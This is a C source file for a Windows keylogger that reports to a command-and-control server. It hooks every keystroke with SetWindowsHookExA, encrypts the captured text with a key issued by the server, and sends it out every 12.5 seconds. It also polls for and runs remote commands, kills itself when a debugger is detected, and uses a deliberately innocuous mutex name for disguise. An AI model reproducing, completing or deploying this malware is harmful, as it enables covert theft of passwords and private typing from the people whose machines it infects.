
#include "program.h"
#include "../client/commands.h"

// prototypes for private functions
static PROGRAM_CONTEXT* initProgramContext();
static void runKeyLogger();
static void doShutdown();

// threading and keyboard hooking functions 
DWORD WINAPI writeLogThread(LPVOID lpParam);
DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam);
LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// global program context variable
PROGRAM_CONTEXT* ctx;


/**
 * Sets up the primary components of the program.
 * Begins by initialising the program context global variable and then 
 * registering the client with the C2 server. Lastly it initiailises 
 * the keylogger's encoding key to the secret key provided by the C2! 
 * 
 * @return whether the program initialisation was sucessful
 */
RET_CODE setup() {
    ctx = initProgramContext(); // 1
    if (ctx == NULL) { return R_NULL; }

    RET_CODE ret = registerClient(ctx->client, &ctx->SECRET_KEY); // 2
    if (ret != R_SUCCESS) { return ret; }
    
    // set the key loggers encoding key
    ctx->kLogger->encKey = ctx->SECRET_KEY;
    return R_SUCCESS;
}


/**
 * initialises a new PROGRAM_CONTEXT structure. This includes initialisation of:
 *   - The CLIENT_HANDLER strucutre
 *   - The KEY_LOGGER strucutre 
 *   - Creates the keyboard hook
 *   - Creates the threading Mutex
 * 
 * @return the address to new program context struct
 */
static PROGRAM_CONTEXT* initProgramContext() {
    PROGRAM_CONTEXT* prCon = malloc(sizeof(PROGRAM_CONTEXT));
    if (prCon == NULL) { printf("A\n"); return NULL; }

    // create client structure
    prCon->client = initClient();
    if (prCon->client == NULL) {
        printf("B\n");
        free(prCon);
        return NULL;
    }
    // create key logger structure
    prCon->kLogger = initKeyLogger();
    if (prCon->kLogger == NULL) {
        printf("D\n");
        free(prCon->client);
        free(prCon);
        return NULL;
    }
    // install the LowLevelKeyboardProc and set the hook
    prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
    if (prCon->hLowLevelKeyHook == NULL) {
        printf("E\n");
        programContextCleanup(prCon);
        return NULL;
    }
    // create mutex and check if it already exists, use a somewhat believeable name :)
    prCon->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
    if (prCon->hMutexThreadSync == NULL || GetLastError() == ERROR_ALREADY_EXISTS)  {
        printf("F\n");
        programContextCleanup(prCon);
        return NULL;
    }

    prCon->mainThreadId = GetCurrentThreadId();
    prCon->hCmdThread = NULL;
    prCon->hWriteThread = NULL;
    prCon->shutdown = FALSE;
    prCon->sleeping = FALSE;
    return prCon;
}


// ----------------------
// --- thread section ---
// ----------------------

/**
 * initialise the workd threads for the malware. These are the threads
 * to continuosly poll commands and write captured logs to the C2. 
 * 
 * @return wehther or not the threads eecuted cleanly
 */
RET_CODE startThreads() {
    // create the worker threads
    HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);
    HANDLE hCmdThr = CreateThread(NULL, 0, pollCmdsAndBeaconThread, NULL, 0, NULL);

    // update the program context
    ctx->hWriteThread = hWriteThr;
    ctx->hCmdThread = hCmdThr;
    if (ctx->hCmdThread == NULL || ctx->hWriteThread == NULL) {
        return R_NULL;
    }

    runKeyLogger();

    // wait for both threads to finish
    HANDLE threads[2] = { ctx->hWriteThread, ctx->hCmdThread };
    WaitForMultipleObjects(2, threads, TRUE, INFINITE);

    printf("Threads complete!\n");
    return R_SUCCESS;
}

/**
 * Function that executes infinitely until shd command is given. 
 * Every 12.5 seconds it attempts to write the captured keys to the 
 * server logs, if the write fails then it tries two more times.
 * Then resets the key logger
 * 
 * NOTE: if the key buffer is empty, then don't 
 * do anything to limit network activity.
 */
DWORD WINAPI writeLogThread(LPVOID lpParam) {
    while (!ctx->shutdown) {
        Sleep(SLP_WRITER_THREAD);
        WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);

#if 1
        printf("Writing logs to C2...\n\n");
#endif

        // skip the write if the buffer is empty
        if (ctx->kLogger->bufferPtr == 0) { goto skipWrite; }

        // tries the to write the key buffer at max 3 times
        int ret = R_POST;
        for (int i = 1; i < 3 && ret == R_POST; i++) {
            ret = writeLogToC2(ctx->client, ctx->kLogger);
        }
        resetKLBufferAndKey(ctx->kLogger, ctx->SECRET_KEY);

        skipWrite:
        ReleaseMutex(ctx->hMutexThreadSync);
    }
    return 0;
}

/**
 * Function that executes infinitely until `shd` command is given. 
 * Each iteration it retrieves the remote commands and then executes them!
 * If we a debugger is detected then terminate immediately, if the 
 * shutdown command is recieved then gradefully close
 */
DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
    while (!ctx->shutdown) {
        Sleep(SLP_CMD_THREAD);
        WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);

#if 1
        printf("Polling cmds from C2...\n\n");
#endif

        RET_CODE ret = pollCommandsAndBeacon(ctx->client);
        // only execute the commands if there is something to exec
        if (ret != R_SUCCESS) {
            printRetCode(ret);
            goto skipCmds;
        }
        
        ret = processCommands(ctx->client);
        switch (ret) {
            case R_DETECT:   // debugger detected, terminate immediately
                TerminateProcess(GetCurrentProcess(), 0);
            case R_DO_SHUTDOWN: 
                doShutdown();
                break;
            default:   // R_SUCCESS
                break;
        }
        
        skipCmds:
        ReleaseMutex(ctx->hMutexThreadSync);
    }
    return 0;
}

/**
 * key logger loop that runs on the main thread!
 * This method simply calls the blocking method GetMessageA, this waits for 
 * a message to be posted to this thread. As such, the keylogger terminates 
 * when the shutdown command is sent, which envokes the doShutdown method
 * which posts a message to the main thread!
 * Resources: https://stackoverflow.com/questions/73340668/how-to-process-key-down-state-on-lowlevelkeyboardproc-with-wh-keyboard
 */
static void runKeyLogger() {
    MSG msg;
    while (!ctx->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return;
}

/**
 * Call back function evoked on every key press, as set by the SetWindowsHookExA 
 * function. Creating this function was also based on the previous functions resource
 */
LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (ctx->sleeping) {  // skip if the program is "sleeping"
        return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
    }
    KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = keyPress->vkCode;

    // skip key presses that update key logger state (shift, capslock and numlock), and key up events
    BOOL wasUpdated = updateKeyLoggerState(ctx->kLogger, wParam, &vkCode);
    if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
    }
    RET_CODE ret = addKeyPressToBuffer(ctx->kLogger, &vkCode);
    if (ret == R_FULL_BUFF) { 
        // did not implement double and copy logic :(
    }

#if 1  // print out the key log for testing
    printf("%s\n", ctx->kLogger->keyBuffer);
#endif

    return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
}

/**
 * Set the shutdown flag to true! Post a message to the main thread, 
 * this will cause the runKeyLogger thread loop to terminate!
 */
static void doShutdown() {
    ctx->shutdown = TRUE;
    PostThreadMessageA(ctx->mainThreadId, WM_QUIT, 0, 0);
}



// ---------------
// --- Cleanup ---
// ---------------

/**
 * simply calls the program context cleanup method passing the 
 * global variable `ctx` as the argument
 */
void programCleanup() {
    programContextCleanup(ctx);
}

/**
 * cleanup function to close each of the handles and free allocated memory
 * 
 * @param prCon the program context structure to be cleaned up
 */
void programContextCleanup(PROGRAM_CONTEXT* prCon) {
    if (prCon == NULL) return;
    
    // free the client
    if (prCon->client != NULL) { clientCleanup(prCon->client); }
    // free the keylogger
    if (prCon->kLogger != NULL) { keyLoggerCleanup(prCon->kLogger); }
    
    //unhook keyboard events
    if (prCon->hLowLevelKeyHook != NULL) {
        UnhookWindowsHookEx(prCon->hLowLevelKeyHook);
    }

    // close thread handles
    if (prCon->hCmdThread != NULL)   { CloseHandle(prCon->hCmdThread); }
    if (prCon->hWriteThread != NULL) { CloseHandle(prCon->hWriteThread); }

    // close mutex handle
    if (prCon->hMutexThreadSync != NULL) { CloseHandle(prCon->hMutexThreadSync); }
    
    free(prCon);
}


